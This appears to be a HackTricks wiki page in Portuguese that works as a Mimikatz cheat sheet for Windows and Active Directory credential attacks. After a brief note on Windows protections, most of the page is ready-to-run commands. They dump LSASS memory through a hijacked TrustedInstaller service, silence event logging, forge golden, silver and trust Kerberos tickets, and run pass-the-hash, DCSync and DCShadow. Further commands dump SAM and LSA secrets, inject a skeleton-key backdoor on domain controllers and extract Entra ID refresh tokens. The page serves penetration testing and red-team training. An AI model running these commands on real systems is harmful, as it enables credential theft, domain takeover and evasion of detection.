# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Esta página é baseada em uma de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Confira a original para mais informações!

## LM and Clear-Text in memory

A partir do Windows 8.1 e do Windows Server 2012 R2, foram implementadas medidas significativas para proteger contra o roubo de credenciais:

- **LM hashes and plain-text passwords** não são mais armazenados em memória para aumentar a segurança. Uma configuração específica do registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ deve ser configurada com um valor DWORD de `0` para desabilitar Digest Authentication, garantindo que senhas em "clear-text" não sejam armazenadas em cache no LSASS.

- **LSA Protection** é introduzida para proteger o processo Local Security Authority (LSA) contra leitura não autorizada de memória e injeção de código. Isso é feito marcando o LSASS como um processo protegido. A ativação de LSA Protection envolve:
1. Modificar o registro em _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ definindo `RunAsPPL` como `dword:00000001`.
2. Implementar um Group Policy Object (GPO) que imponha essa alteração de registro em todos os dispositivos gerenciados.

Apesar dessas proteções, ferramentas como Mimikatz podem contornar a LSA Protection usando drivers específicos, embora essas ações provavelmente sejam registradas nos logs de eventos.

Em estações de trabalho modernas isso importa ainda mais porque **Credential Guard está habilitado por padrão em muitos sistemas Windows 11 22H2+ e Windows Server 2025 joined to domain, não-DC**, enquanto **LSASS-as-PPL está habilitado por padrão em instalações novas do Windows 11 22H2+**. Na prática, isso significa que `sekurlsa::logonpasswords` frequentemente retorna menos material do que o esperado em técnicas mais antigas, e operadores cada vez mais fazem pivot para **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, ou módulos orientados a **CloudAP/PRT**. Para a parte de proteção, confira [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administradores normalmente têm SeDebugPrivilege, permitindo depurar programas. Esse privilégio pode ser restringido para impedir memory dumps não autorizados, uma técnica comum usada por atacantes para extrair credenciais da memória. No entanto, mesmo com esse privilégio removido, a conta TrustedInstaller ainda pode realizar memory dumps usando uma configuração de serviço customizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Isso permite o dump da memória do `lsass.exe` para um arquivo, que então pode ser analisado em outro sistema para extrair credenciais:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

A adulteração de event logs no Mimikatz envolve duas ações principais: limpar event logs e fazer patch no serviço Event para impedir o registro de novos eventos. Abaixo estão os comandos para executar essas ações:

#### Clearing Event Logs

- **Command**: Esta ação tem como objetivo apagar os event logs, tornando mais difícil rastrear atividades maliciosas.
- O Mimikatz não fornece um comando direto em sua documentação padrão para limpar event logs diretamente via sua linha de comando. No entanto, a manipulação de event logs normalmente envolve o uso de ferramentas do sistema ou scripts fora do Mimikatz para limpar logs específicos (por exemplo, usando PowerShell ou Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Este comando experimental foi projetado para modificar o comportamento do Event Logging Service, impedindo efetivamente que ele registre novos eventos.
- Exemplo: `mimikatz "privilege::debug" "event::drop" exit`

- O comando `privilege::debug` garante que o Mimikatz opere com os privilégios necessários para modificar system services.
- O comando `event::drop` então faz patch no serviço Event Logging.

### Kerberos Ticket Attacks

Use os comandos abaixo como lembretes rápidos de sintaxe. As páginas dedicadas para [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), e [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contêm as nuances atualizadas de AES/PAC/opsec.

### Golden Ticket Creation

Um Golden Ticket permite personificação com acesso em todo o domínio. Comando e parâmetros principais:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: O nome do domínio.
- `/sid`: O Security Identifier (SID) do domínio.
- `/user`: O nome de usuário a personificar.
- `/krbtgt`: O hash NTLM da conta de serviço KDC do domínio.
- `/ptt`: Injeta o ticket diretamente na memória.
- `/ticket`: Salva o ticket para uso posterior.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Criação de Silver Ticket

Silver Tickets concedem acesso a serviços específicos. Comando e parâmetros principais:

- Command: Similar ao Golden Ticket, mas visa serviços específicos.
- Parameters:
- `/service`: O serviço a ser visado (por exemplo, cifs, http).
- Outros parâmetros similares ao Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Criação de Trust Ticket

Trust Tickets são usados para acessar recursos entre domínios aproveitando trust relationships. Comandos e parâmetros principais:

- Command: Similar to Golden Ticket but for trust relationships.
- Parameters:
- `/target`: O FQDN do domínio de destino.
- `/rc4`: O hash NTLM da conta de trust.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos adicionais de Kerberos

- **Listando Tickets**:

- Comando: `kerberos::list`
- Lista todos os tickets Kerberos da sessão atual do usuário.

- **Pass the Cache**:

- Comando: `kerberos::ptc`
- Injeta tickets Kerberos de arquivos de cache.
- Exemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Comando: `kerberos::ptt`
- Permite usar um ticket Kerberos em outra sessão.
- Exemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purgar Tickets**:
- Comando: `kerberos::purge`
- Limpa todos os tickets Kerberos da sessão.
- Útil antes de usar comandos de manipulação de tickets para evitar conflitos.

### Over-Pass-the-Hash / Pass-the-Key

Se `RC4` estiver desativado ou for pouco confiável, o Mimikatz pode aplicar patch em **chaves Kerberos AES128/AES256** na sessão de logon atual em vez de usar apenas um hash NT. Isso geralmente se encaixa melhor em domínios modernos do que tratar `sekurlsa::pth` como somente NTLM.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` reutiliza o processo atual em vez de abrir um novo console, o que é útil quando você quer executar imediatamente coisas como `lsadump::dcsync` no mesmo contexto.

### Active Directory Tampering

- **DCShadow**: Faz temporariamente uma máquina agir como um DC para manipulação de objetos de AD. Veja [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita um DC para solicitar dados de senha. Veja [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Extrai credenciais do LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Impersona um DC usando os dados de senha de uma conta de computador.

- _Nenhum comando específico foi fornecido para NetSync no contexto original._

- **LSADUMP::SAM**: Acessa o banco de dados local SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descriptografa segredos armazenados no registry.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Define um novo hash NTLM para um usuário.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera informações de autenticação de trust.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Em hosts **Entra ID** ou **hybrid-joined**, `sekurlsa::cloudap` pode expor material em cache do **Primary Refresh Token (PRT)** do LSASS. Se a chave Proof-of-Possession associada estiver protegida por software, `dpapi::cloudapkd` pode derivar o material de chave claro/derivado necessário para workflows subsequentes de **Pass-the-PRT**.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Isto fica muito mais difícil quando a chave é protegida por TPM, mas vale a pena verificar em endpoints híbridos porque os dados em cache do CloudAP podem ser mais interessantes do que a saída clássica do `wdigest`. Para a cadeia de abuso do lado da cloud, veja [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Injeta uma backdoor no LSASS em um DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Adquire direitos de backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtém privilégios de debug.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Mostra credenciais de usuários logados.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extrai Kerberos tickets da memória.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Altera SID e SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Nenhum comando específico para modify no contexto original._

- **TOKEN::Elevate**: Impersona tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Permite múltiplas sessões RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lista sessões TS/RDP.
- _Nenhum comando específico fornecido para TS::Sessions no contexto original._

### Vault

- Extrai passwords do Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
